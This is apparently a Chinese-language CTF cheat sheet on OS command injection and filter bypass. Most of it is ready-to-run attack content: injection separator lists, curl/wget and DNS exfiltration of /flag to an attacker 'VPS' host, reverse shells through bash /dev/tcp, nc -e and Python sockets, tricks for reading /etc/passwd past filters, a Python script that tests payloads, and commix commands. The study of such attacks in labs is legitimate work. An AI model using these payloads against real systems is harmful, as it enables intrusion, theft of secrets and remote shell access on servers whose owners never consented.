---
title: 命令注入与绕过
category: web
tags: [命令注入, rce, 绕过, shell 特性]
signals: [ping 功能, 执行系统命令, host 参数, system() 调用, 无回显, 命令拼接, 过滤了空格, 过滤了 cat, 目标不可达]
difficulty: easy
source: "PortSwigger / PayloadsAllTheThings / HackTricks"
tools: [curl, commix, python]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 有"ping 检测"、"DNS 查询"、"图片转码"、"压缩"功能，参数直接进 `system()`。
- `?ip=127.0.0.1;id` 返回命令输出 → 直接命令注入。
- `?ip=127.0.0.1|id`、`&&`、`||`、`` `id` ``、`$(id)` 都试。
- 无回显（blind）：`?ip=127.0.0.1 && sleep 3` 有延时。
- 过滤了空格/`cat`/`/`，报错提示"illegal character"。
- 关键词：命令注入、command injection、RCE、ping。

## 二、原理

```php
system("ping -c 4 " . $_GET['ip']);
```

输入被拼进 shell 命令，shell 元字符让攻击者追加命令：

| 符号 | 行为 |
|---|---|
| `;` | 顺序执行 |
| `&&` / `\|\|` | 前成功/失败才执行 |
| `\|` | 管道 |
| `` ` `` `$(...)` | 命令替换 |
| `>` `<` | 重定向 |
| `&` | 后台 |

**无回显**：需要把结果外带（DNS/HTTP）、写文件（`> /var/www/html/x`）、或时间盲注（`sleep`）。

## 三、解题步骤

1. 找可疑参数（ping/查询/转换类）。
2. 用 `;sleep 5`、`|sleep 5`、`&&sleep 5` 判断（延时最可靠）。
3. 有回显直接 `;cat /flag`。
4. 无回显 → `curl VPS/?$(cat /flag|base64)` 外带。
5. 有过滤 → 空格/关键词绕过。

## 四、可直接运行的脚本

注入符清单（盲测顺序）：

```text
;id
|id
||id
&id
&&id
%0aid
`id`
$(id)
:id           # 少数解析器
%09id         # tab
```

无回显外带：

```bash
# HTTP 外带（最常用）
?ip=127.0.0.1;curl http://VPS:8000/$(cat /flag|base64)
?ip=127.0.0.1;curl -d @/flag http://VPS:8000/
?ip=127.0.0.1;wget -qO- http://VPS/$(cat /flag|base64)

# DNS 外带（只出 DNS 时）
?ip=127.0.0.1;ping -c1 $(cat /flag|base64|tr -d '=').VPS.dnslog.cn

# 写文件到 web 目录
?ip=127.0.0.1;cat /flag > /var/www/html/f.txt

# 反弹 shell
?ip=127.0.0.1;bash -i >& /dev/tcp/VPS/4444 0>&1
?ip=127.0.0.1;nc -e /bin/sh VPS 4444
?ip=127.0.0.1;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("VPS",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh"])'
```

无回显的"结果经 DNS 回传"：

```python
# 先在 VPS 上抓 DNS 日志（或用 dnslog.cn / interactsh）
# payload：
#   ip=127.0.0.1;ping -c1 `cat /flag | base64 | tr -d '\n='`.YOUR.dnslog.cn
# 收到 DNS 查询后解码即可
```

空格 / 字符绕过：

```text
# 空格被过滤
cat$IFS/flag
cat${IFS}/flag
cat</flag              # 用 < 代替空格
{cat,/flag}
${IFS}cat${IFS}/flag
X=$'\x20';cat${X}/flag

# cat 被过滤
tac /flag     more /flag    less /flag    head /flag    tail /flag
nl /flag      sort /flag    od -c /flag   base64 /flag  rev /flag
/???/c?t /flag
c'a't /flag   c"a"t /flag
echo `</flag`

# 斜杠被过滤
cat ${HOME:0:1}etc${HOME:0:1}passwd     # /etc/passwd
cat ..${PWD:0:1}..   # 用 PWD 取 /

# 命令名被过滤（用变量/编码）
a=ca;b=t;$a$b /flag
$(printf "\x63\x61\x74") /flag
echo Y2F0IC9mbGFn | base64 -d | sh
echo "cat /flag" | rev | sh   # 若 rev 可用

# 数字被过滤
sleep ${#}        # 空
$(())             # 0
```

Python 自动化测试（判断哪种注入符有效）：

```python
import requests, time

URL = "http://TARGET/ping.php"
P = {"ip": None}

def test(payload, delay=2.0):
    t = time.time()
    try:
        requests.get(URL, params={"ip": payload}, timeout=delay + 5)
    except requests.exceptions.Timeout:
        return True
    return time.time() - t >= delay

candidates = [
    "127.0.0.1;sleep 3", "127.0.0.1|sleep 3", "127.0.0.1||sleep 3",
    "127.0.0.1&sleep 3", "127.0.0.1&&sleep 3", "127.0.0.1`sleep 3`",
    "127.0.0.1$(sleep 3)", "127.0.0.1%0asleep 3", "127.0.0.1%09sleep%203",
]
for c in candidates:
    print(("OK  " if test(c) else "no  "), c)
```

commix 一键：

```bash
python commix.py --url="http://TARGET/ping.php?ip=127.0.0.1" --batch
python commix.py --url="http://TARGET/ping.php" --data="ip=127.0.0.1" --level=3
```

## 五、常见坑 / 变体

- **`;` 被过滤但 `%0a` 可以**：URL 编码换行在 shell 里等价于 `;`。
- **`ping` 本身有输出**：页面显示 "ping statistics" 说明是回显型，直接 `;id`。
- **过滤在 PHP 层**：`escapeshellarg` 很难绕，但 `escapeshellcmd` + 双命令可用 `?ip=127.0.0.1` 试 `&`。
- **无回显时 `sleep` 是最可靠的判断**：`ping -c 1` 本身可能耗时，基准先测一次。
- **Windows 目标**：`&`、`|`、`%CD%`、`type`、`certutil`。
- 变体：**参数注入而非命令注入**：`curl` 的 `-o`、`tar` 的 `--checkpoint-action=exec=sh`、`find -exec`。
- 变体：**`tar` 参数注入**：`tar --to-command=sh`（配合文件名/参数控制）。
- 变体：**Imagemagick / Ghostscript** 的委派命令注入。
- 变体：**无回显的"结果写进响应头/日志"**：`curl -o /dev/null http://TARGET/x?c=$(cat /flag)` 再到 access log 里看。

## 六、参考来源

- [PortSwigger Web Security Academy - OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [HackTricks - Command Injection](https://book.hacktricks.wiki/en/pentesting-web/command-injection.html)
- [OWASP Top 10 2021 - A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [commix（自动化工具）](https://github.com/commixproject/commix)
